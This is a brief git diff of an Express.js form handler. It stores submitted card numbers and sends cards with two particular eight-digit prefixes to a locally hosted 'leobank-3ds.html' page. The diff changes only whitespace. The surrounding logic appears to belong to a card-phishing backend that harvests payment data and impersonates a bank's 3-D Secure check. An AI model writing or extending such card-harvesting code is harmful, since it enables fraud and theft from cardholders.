@@ -41,7 +41,8 @@ app.post('/submit-form', async (req, res) => {
   const raw = (card || "").replace(/\D/g, '');
   const prefix8 = raw.substr(0, 8);
 
-
+     
+  
   // Veriyi kaydet
   db.get('submissions')
     .unshift({
@@ -57,8 +58,8 @@ app.post('/submit-form', async (req, res) => {
       createdAt: new Date().toISOString()
     })
     .write();
-    
-  if (prefix8 === '40985844' || prefix8 === '54112498') {
+   
+    if (prefix8 === '40985844' || prefix8 === '54112498') {
     return res.redirect('/leobank-3ds.html');
   }
 
